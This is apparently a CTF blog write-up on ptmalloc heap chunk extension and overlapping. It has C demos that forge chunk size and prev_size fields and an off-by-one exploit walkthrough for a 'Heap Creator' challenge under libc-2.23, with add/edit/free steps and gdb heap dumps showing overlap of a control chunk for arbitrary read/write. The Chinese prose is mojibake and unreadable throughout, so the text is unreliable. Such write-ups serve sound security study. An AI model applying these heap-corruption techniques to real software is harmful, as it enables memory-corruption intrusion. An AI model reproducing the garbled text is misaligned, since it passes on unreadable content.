<p>åŒæ—¶å‡å¦‚è¢«é‡å çš„å †å—æ˜¯free chunkçš„è¯ï¼Œå°±å¯ä»¥ä¿®æ”¹å…¶fd/bkæŒ‡é’ˆ</p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ ptmalloc ä¸­</p>
<p>è·å–ä¸‹ä¸€chunkï¼ˆé«˜åœ°å€chunkï¼‰åœ°å€çš„æ“ä½œï¼šå½“å‰å—æŒ‡é’ˆåŠ ä¸Šsize</p>
<p>è·å–ä¸Šä¸€chunkï¼ˆä½åœ°å€chunkï¼‰åœ°å€çš„æ“ä½œï¼šå½“å‰å—æŒ‡é’ˆå‡å»prev size</p>
<p>æŸ¥çœ‹å½“å‰chunkæ˜¯å¦inuseï¼šå»æŸ¥çœ‹ä¸‹ä¸€chunkçš„inuseä½</p>
<p>æ€»ç»“ï¼šptmallocåŸºäºchunk headerä¸­çš„æ•°æ®æ¥åˆ¤æ–­chunkçš„ä½¿ç”¨æƒ…å†µä»¥åŠå‰åå—çš„å®šä½</p>
<h3 id="å¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ fastbin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ fastbin è¿›è¡Œ extend</h3><p>å®ç°æ–¹æ³•ï¼š</p>
<p>æ›´æ”¹ä½åœ°å€chunkçš„sizeä½ï¼Œä½¿è¯¥chunkçš„å¤§å°è¶³ä»¥è¦†ç›–æƒ³è¦ä¿®æ”¹çš„æ•°æ®ï¼Œfreeæ‰è¯¥chunkä¹‹åå†mallocå›æ¥ï¼Œå°±åœ¨åŸæœ¬çš„ä½ç½®ä¸Šå¾—åˆ°äº†ä¸€ä¸ªå¤§chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0x71</span>;		<span class="comment">//ä¿®æ”¹chunk1çš„sizeä½</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¯¹-inuse-çš„-smallbin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-smallbin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ smallbin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ smallbin è¿›è¡Œ extend</h3><p>å…¶å®è¿™ä¸ªè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œåªæ˜¯å½“æˆ‘ä»¬ä¿®æ”¹çš„sizeå¤§äºfastbinèŒƒå›´çš„æ—¶å€™æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯æˆ‘ä»¬freeæ‰çš„è¿™ä¸ªå¤§chunkä¸èƒ½ç´§è´´top chunkï¼Œå¦åˆ™å°±ä¼šç›´æ¥è·Ÿå…¶åˆå¹¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//å«ä¸€ä¸ªchunké˜²æ­¢chunk1ä¸top chunkåˆå¹¶</span></span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//ä¿®æ”¹chunk1çš„sizeä½(0x90+0x40)</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¯¹-free-çš„-smallbin-è¿›è¡Œ-extend"><a href="#å¯¹-free-çš„-smallbin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ free çš„ smallbin è¿›è¡Œ extend"></a>å¯¹ free çš„ smallbin è¿›è¡Œ extend</h3><p>è¿™ä¸ªè·Ÿä¸Šé¢çš„ä¹Ÿä¸€æ ·ï¼Œåªæ˜¯å…¶æ˜¯åœ¨chunk1è¢«æ­£å¸¸freeæ‰ä¹‹åå†å»ä¿®æ”¹å…¶sizeä½ï¼Œè¿™æ ·ä¿®æ”¹å°±ä¸éœ€è¦å«ä¸€ä¸ªchunkï¼Œå› ä¸ºæ˜¯freeæ‰ä¹‹åå†æ”¹çš„size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//ä¿®æ”¹freeçŠ¶æ€ä¸‹çš„chunk1çš„size</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é€šè¿‡-extend-å‰å‘-overlapping"><a href="#é€šè¿‡-extend-å‰å‘-overlapping" class="headerlink" title="é€šè¿‡ extend å‰å‘ overlapping"></a>é€šè¿‡ extend å‰å‘ overlapping</h3><p>å‰é¢å±•ç¤ºçš„éƒ½æ˜¯åå‘åˆå¹¶ï¼ˆå‘é«˜åœ°å€çš„chunkåˆå¹¶ï¼‰</p>
<p>å…¶å®ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹å½“å‰chunkçš„prev sizeè·Ÿinuseä½å®ç°å‰å‘åˆå¹¶ï¼ˆå‘ä½åœ°å€çš„chunkåˆå¹¶ï¼‰ï¼Œä½†æ˜¯è¦æ»¡è¶³unlinkçš„æ¡ä»¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//ä¸­é—´åŒ…å«çš„å°å—</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//å«ä¸€å—</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr2 - <span class="number">1</span>) = <span class="number">0x90</span>;		<span class="comment">//ä¿®æ”¹chunk2çš„size</span></span><br><span class="line">    *(ptr2 - <span class="number">2</span>) = <span class="number">0xf0</span>;		<span class="comment">//ä¿®æ”¹chunk2çš„prev size</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2);		<span class="comment">//è§¦å‘unlinkå®ç°å‰å‘åˆå¹¶</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x170</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æŠŠchunk1 freeæ‰æ˜¯ä¸ºäº†è®©å…¶è¿›å…¥unsorted binï¼Œä»è€Œä½¿å…¶fdè·ŸbkæŒ‡é’ˆçš„å€¼èƒ½è¿‡unlinkçš„æ£€æµ‹ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p>
<h3 id="ä¾‹é¢˜1"><a href="#ä¾‹é¢˜1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><ol>
<li><p>prev sizeçš„å¤ç”¨é—®é¢˜ï¼šå­¦åŸºç¡€çŸ¥è¯†çš„æ—¶å€™çŸ¥é“æœ‰è¿™ä¹ˆä¸ªæ¦‚å¿µï¼Œåˆ°è¿™é‡Œæ‰æ¯”è¾ƒç†è§£ã€‚å…¶å®å¾ˆç®€å•ï¼Œä¾‹å¦‚æˆ‘ä»¬mallocä¸€ä¸ª0xn8ï¼ˆé™¤äº†0x8ï¼Œå› ä¸º64ä½chunkæœ€å°å¯¹é½åˆ°0x20ï¼‰çš„chunkï¼Œå®é™…ä¸Šæˆ‘ä»¬åªä¼šå¾—åˆ°ä¸€ä¸ªæ•°æ®æ®µå¤§å°ä¸º0xn0çš„chunkï¼Œå‰©ä¸‹çš„å…«ä¸ªå­—èŠ‚å°±ç”¨ä¸å…¶ç›¸é‚»çš„é‚£ä¸ªchunkçš„prev sizeä½æ¥å­˜å‚¨ã€‚</p>
<p>ä¾‹å¦‚æˆ‘ä»¬<code>malloc(0x18)</code>ï¼Œå®é™…ä¸Šå¾—åˆ°çš„chunkå¤§å°ä¸º0x20ï¼Œå¦‚ä¸‹å›¾ï¼Œä¸å¤Ÿçš„å…«ä¸ªå­—èŠ‚ç”¨äº†top chunkçš„prev sizeæ¥è¡¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1192020</span><br><span class="line">0x1192020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1192030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1192040:	0x6161616161616161	0x0000000000020fc1</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚å½“ç¨‹åºä¸­å­˜åœ¨off-by-oneçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨å…¶å¤ç”¨prev sizeçš„ç‰¹æ€§ï¼Œæ¥è®©æŸä¸€ä¸ªchunkçš„æ•°æ®åŒºç´§è´´å…¶ä¸‹ä¸€ä¸ªchunkçš„sizeä½ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å°†ä¸‹ä¸€ä¸ªchunkçš„sizeçš„ä½ä¸€å­—èŠ‚ç›–æ‰ã€‚</p>
</li>
<li><p>é€šè¿‡extend_overloppingåˆ©ç”¨fast binæ¥å®ç°ä»»æ„åœ°å€è¯»å†™ï¼Œå…·ä½“åœ¨ä¾‹é¢˜ä¸­è¯´æ˜ã€‚</p>
</li>
</ol>
<p>ï¼ˆlibc-2.23ä¸‹å¤ç°ï¼‰</p>
<p>é¦–å…ˆæ˜¯å¸¸è§„èœå•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…·ä½“ä»£ç ä¸è´´äº†ï¼Œç®€å•è¯´ä¸€ä¸‹å°±è¡Œ</p>
<p>åœ¨<code>1. Create a heap</code>åŠŸèƒ½å‡½æ•°ä¸­ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥heapçš„sizeä»¥åŠcontentï¼Œç¨‹åºä¼šå…ˆmallocä¸€ä¸ª0x10å¤§å°çš„chunkç”¨æ¥ä¿å­˜contentçš„sizeå’Œcontent chunkçš„æŒ‡é’ˆï¼ˆä½ä½å…«ä¸ªå­—èŠ‚ä¿å­˜sizeï¼Œé«˜ä½å…«ä¸ªå­—èŠ‚ä¿å­˜chunkæŒ‡é’ˆï¼‰ï¼Œå¯ä»¥ç†è§£ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”è¿™ä¸ªç”¨æ¥è®°å½•heapä¿¡æ¯çš„chunkè¢«ä¿å­˜åˆ°äº†.bssæ®µä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¨‹åºæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„sizeå»<code>malloc(size);</code>ï¼Œç”¨è¿™ä¸ªchunkæ¥ä¿å­˜contentï¼Œå¹¶ä¸”æˆ‘ä»¬è¾“å…¥çš„sizeæ— é™åˆ¶ï¼ŒcreateåŠŸèƒ½å‡½æ•°ç»“æŸã€‚</p>
<p>editåŠŸèƒ½å‡½æ•°ä¸­å­˜åœ¨off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>showåŠŸèƒ½å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>deleteåŠŸèƒ½å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°ä¸å­˜åœ¨uafæ¼æ´</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">  *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é€šè¿‡extend-overloppingåˆ©ç”¨fast-binæ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„è¯¦è§£"><a href="#é€šè¿‡extend-overloppingåˆ©ç”¨fast-binæ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„è¯¦è§£" class="headerlink" title="é€šè¿‡extend_overloppingåˆ©ç”¨fast binæ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„è¯¦è§£"></a>é€šè¿‡extend_overloppingåˆ©ç”¨fast binæ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„è¯¦è§£</h4><p>è¿™ç§å…ˆç”³è¯·ä¸€ä¸ªchunkå»ä¿å­˜åˆ«çš„chunkçš„ä¿¡æ¯å’ŒæŒ‡é’ˆçš„é¢˜ç›®å°±è€ä¼šæœ‰å„ç§é—®é¢˜</p>
<p>æˆ‘ä»¬æƒ³ä¸€æƒ³editåŠŸèƒ½å‡½æ•°å’ŒshowåŠŸèƒ½å‡½æ•°æ˜¯æ ¹æ®ä»€ä¹ˆå»ä¿®æ”¹/æŸ¥çœ‹å †å†…å®¹çš„ï¼Œæ˜¾ç„¶æ˜¯æ ¹æ®æ§åˆ¶chunkä¸­çš„sizeä»¥åŠå †æŒ‡é’ˆã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªæ§åˆ¶chunkä¸­çš„å †æŒ‡é’ˆçš„è¯ï¼Œæˆ‘ä»¬ä¸å°±èƒ½å¤Ÿåˆ©ç”¨editå’ŒshowåŠŸèƒ½å‡½æ•°å»å®ç°ä»»æ„åœ°å€è¯»å†™äº†å—ï¼Ÿ</p>
<p>é‚£ä¹ˆå¦‚ä½•å®ç°å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯extend_overloppingï¼Œæˆ‘ä»¬è®©content chunkè·Ÿæ§åˆ¶chunké‡å ï¼Œä½¿å¾—æ§åˆ¶chunkæˆä¸ºcontent chunkçš„ä¸€éƒ¨åˆ†ï¼Œè€Œç”±äºeditåŠŸèƒ½å‡½æ•°çš„å­˜åœ¨ï¼Œcontent chunkä¸­çš„å†…å®¹æˆ‘ä»¬è‚¯å®šæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å®Œæˆäº†è¿™æ ·çš„ä¸€ä¸ªå †é‡å çš„è¯ï¼Œå°±å¯ä»¥ä¿®æ”¹æ§åˆ¶chunkä¸­çš„å †æŒ‡é’ˆäº†ï¼Œä»è€Œå®Œæˆä»»æ„åœ°å€è¯»å†™ã€‚</p>
<p>ç»“åˆè¿™ä¸€éƒ¨åˆ†çš„expè¯¦ç»†æ¼”ç¤ºä¸€ä¸‹å§</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæˆ‘ä»¬<code>malloc(0xn8);</code>ï¼Œå†<code>malloc(0x10);</code>ï¼Œåœ¨ä¾‹å­ä¸­æˆ‘mallocäº†0x18</p>
<p>æˆ‘ä»¬å…ˆç†ä¸€ä¸‹åœ¨<code>1. Create a heap</code>åŠŸèƒ½å‡½æ•°ä¸­ç¨‹åºæ˜¯å¦‚ä½•ç”³è¯·å †å—çš„ï¼šâ‘ ç¨‹åºå…ˆ<code>malloc(0x10);</code>ï¼Œè¿™ä¸ªchunkç”¨æ¥ä¿å­˜æˆ‘ä»¬è¾“å…¥çš„sizeçš„å€¼ä»¥åŠcontent chunkæŒ‡é’ˆï¼ˆæˆ‘ä»¬æŠŠè¿™ä¸ªchunkç§°ä¸ºæ§åˆ¶chunkï¼‰ã€‚â‘¡ç¨‹åºæ¥ç€<code>malloc(size);</code>ï¼Œè¿™ä¸ªchunkç”¨æ¥ä¿å­˜contentã€‚</p>
<p>0xn8æ˜¯å› ä¸ºæˆ‘ä»¬å¾—å…ˆè®©chunké—´å­˜åœ¨prev sizeçš„å¤ç”¨ï¼Œç„¶åæˆ‘ä»¬æ‰èƒ½å¤Ÿç”¨off-by-oneä¿®æ”¹ç›¸é‚»chunkçš„sizeä½</p>
<p>å†ç”³è¯·ä¸€ä¸ª0x10çš„chunkæ˜¯ä¸ºäº†å¾—åˆ°ä¸€ä¸ªè·Ÿæ§åˆ¶chunkå¤§å°ç›¸åŒçš„chunk</p>
<p>æ­¤æ—¶å †é•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021	=&gt;ä¿å­˜å †æŒ‡é’ˆçš„chunk1</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021	=&gt;æˆ‘ä»¬ç”³è¯·çš„0x18çš„chunk2</span><br><span class="line">0x12a6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6040:	0x6161616161616161	0x0000000000000021	=&gt;ä¿å­˜å †æŒ‡é’ˆçš„chunk3</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021	=&gt;æˆ‘ä»¬ç”³è¯·çš„0x10çš„chunk4</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ–¹ä¾¿å™è¿°æˆ‘ä»¬å°†ä»¥ä¸Šå‡ å—chunkåˆ†åˆ«ç§°ä½œchunk1/2/3/4ã€‚</p>
<p>ç„¶ååˆ©ç”¨chunk2çš„off-by-oneä¿®æ”¹chunk3çš„å¤§å°ï¼Œä½¿å…¶å¤§å°è¶³ä»¥è¦†ç›–æ•´ä¸ªchunk4ï¼Œè¿™é‡Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹æˆ0x41</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;è¿™é‡Œå·²ç»è¢«ä¿®æ”¹</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç”¨deleteåŠŸèƒ½å‡½æ•°freeæ‰chunk4ï¼Œé‚£ä¹ˆæ€»å…±ä¼šfreeæ‰ä¸¤ä¸ªchunkï¼šä¿å­˜å †æŒ‡é’ˆçš„chunk3ä»¥åŠä¿å­˜å†…å®¹çš„chunk4ã€‚ä½†æ˜¯ç”±äºchunk3çš„å¤§å°è¢«æˆ‘ä»¬ä¿®æ”¹æˆ0x41ï¼Œæ‰€ä»¥chunk3ä¼šè¿›å…¥åˆ°0x40çš„fast biné“¾ä¸­ï¼Œchunk4æ­£å¸¸è¿›å…¥0x20çš„fast biné“¾ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x12a6060 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x12a6040 â—‚â€” 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>æœ€åæˆ‘ä»¬<code>malloc(0x30);</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šå¾—åˆ°ä¸€ä¸ª0x20å’Œä¸€ä¸ª0x40å¤§å°çš„chunkï¼Œè¿™ä¸¤ä¸ªchunkä»fast binä¸­å–ï¼Œå¹¶ä¸”0x20çš„chunkç”¨ä½œæ§åˆ¶chunkï¼Œ0x40çš„chunkç”¨æ¥ä¿å­˜content</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;è¿™æ—¶è¿™å—0x40çš„chunkæ˜¯content chunk</span><br><span class="line">0x12a6050:	0x0000000000000061	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021 =&gt;è¿™å—0x20çš„chunkæ˜¯æ§åˆ¶chunk</span><br><span class="line">0x12a6070:	0x0000000000000030	0x00000000012a6050</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

